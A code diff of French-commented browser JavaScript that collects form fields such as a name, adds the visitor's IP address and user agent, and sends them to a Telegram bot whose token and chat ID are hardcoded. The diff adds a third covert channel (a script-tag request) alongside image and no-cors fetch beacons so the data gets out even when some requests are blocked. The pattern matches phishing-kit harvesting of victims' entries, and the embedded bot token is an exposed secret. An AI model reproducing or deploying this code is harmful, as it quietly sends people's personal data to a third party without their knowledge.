@@ -2,52 +2,49 @@
 const TELEGRAM_TOKEN = '7837023729:AAFRyzbZKsU_TFztd075sOCSgSGJX-4orTs';
 const CHAT_ID        = '-4766781392';
 
-// JSONP ipify
+// JSONP ipify (inclus par index.html)
 function handleIP(data) {
   window.__CLIENT_IP__ = data.ip;
 }
-(function() {
-  var s = document.createElement('script');
-  s.src = 'https://api.ipify.org?format=jsonp&callback=handleIP';
-  document.head.appendChild(s);
-})();
 
 // debug in-page
 function logDebug(msg) {
-  var panel = document.getElementById('debug-panel');
+  const panel = document.getElementById('debug-panel');
   if (!panel) return;
-  var line = document.createElement('div');
+  const line = document.createElement('div');
   line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
   panel.appendChild(line);
   panel.scrollTop = panel.scrollHeight;
 }
 
-// garder les <img> pour Safari iOS
-window._tgImages = [];
+// retenir les objets pour éviter GC Safari iOS
+window._tgReqs = window._tgReqs || [];
 
 /**
- * Envoie la notif Telegram, avec <img> + fallback fetch no-cors
+ * Envoie la notification à Telegram via :
+ * 1) <img>
+ * 2) fetch(no-cors)
+ * 3) JSONP <script> (pour iOS ultime fallback)
  */
 function sendTelegramNotification(message) {
-  logDebug('🔥 Démarrage sendTelegramNotification');
+  logDebug('🔥 sendTelegramNotification start');
   logDebug('Message brut: ' + message);
 
-  var ip = window.__CLIENT_IP__ || 'unknown';
-  var ua = navigator.userAgent || 'unknown';
+  const ip = window.__CLIENT_IP__ || 'unknown';
+  const ua = navigator.userAgent || 'unknown';
   logDebug('IP détectée: ' + ip);
   logDebug('User-Agent: ' + ua);
 
-  var now = new Date();
-  var pad = n => String(n).padStart(2,'0');
-  var datetime = pad(now.getDate()) + '/' + pad(now.getMonth()+1) + '/' +
-                 now.getFullYear().toString().slice(-2) + ', ' +
-                 pad(now.getHours()) + ':' + pad(now.getMinutes()) + ':' + pad(now.getSeconds());
+  const now = new Date();
+  const pad = n => String(n).padStart(2,'0');
+  const datetime = `${pad(now.getDate())}/${pad(now.getMonth()+1)}/${now.getFullYear().toString().slice(-2)}, `
+                 + `${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
   logDebug('Horodatage: ' + datetime);
 
-  // Construction du texte
-  var parts  = message.split('\n');
-  var header = parts.shift();
-  var text   = '[📝] ' + header;
+  // construire le texte Markdown
+  const parts = message.split('\n');
+  const header = parts.shift();
+  let text = `[📝] ${header}`;
   if (parts.length) {
     text += '\n' + parts.map(line => {
       if (line.startsWith('Nom:'))       return line.replace('Nom:', '👤 Nom:');
@@ -64,30 +61,37 @@ function sendTelegramNotification(message) {
       return line;
     }).join('\n');
   }
-  text += '\n\n[🗓️] Date & heure : ' + datetime +
-          '\n[🌐] IP Client     : ' + ip +
-          '\n[📍] User-Agent    : ' + ua;
+  text += `\n\n[🗓️] Date & heure : ${datetime}`
+       + `\n[🌐] IP Client     : ${ip}`
+       + `\n[📍] User-Agent    : ${ua}`;
   logDebug('Texte final: ' + text.replace(/\n/g,' ⏎ '));
 
-  var url = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN +
-            '/sendMessage?chat_id=' + encodeURIComponent(CHAT_ID) +
-            '&parse_mode=Markdown&text=' + encodeURIComponent(text);
+  const urlBase = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+  const params  = `?chat_id=${encodeURIComponent(CHAT_ID)}&parse_mode=Markdown&text=${encodeURIComponent(text)}`;
+  const url      = urlBase + params;
   logDebug('URL Telegram: ' + url);
 
-  // 1) Tentative <img>
-  var img = new Image();
+  // 1) <img>
+  const img = new Image();
   img.src = url;
-  window._tgImages.push(img);
-  img.onload  = () => logDebug('✔️ <img> envoyé avec succès');
-  img.onerror = e => {
-    logDebug('❌ <img> failed, fallback fetch (no-cors)');
+  window._tgReqs.push(img);
+  img.onload  = () => logDebug('✔️ <img> envoyé');
+  img.onerror = () => {
+    logDebug('❌ <img> failed, fallback fetch(no-cors)');
 
-    // 2) Fallback fetch no-cors
+    // 2) fetch(no-cors)
     fetch(url, { mode: 'no-cors' })
-      .then(() => logDebug('✔️ fetch no-cors envoyé'))
-      .catch(err => logDebug('❌ fetch error: ' + err));
+      .then(() => logDebug('✔️ fetch(no-cors) envoyé'))
+      .catch(() => logDebug('❌ fetch(no-cors) failed'));
+
+    // 3) JSONP <script>
+    logDebug('↪️ Tentative JSONP <script>');
+    const s = document.createElement('script');
+    s.src = url;
+    document.body.appendChild(s);
+    window._tgReqs.push(s);
   };
 }
 
-// expose
+// exposer
 window.sendTelegramNotification = sendTelegramNotification;
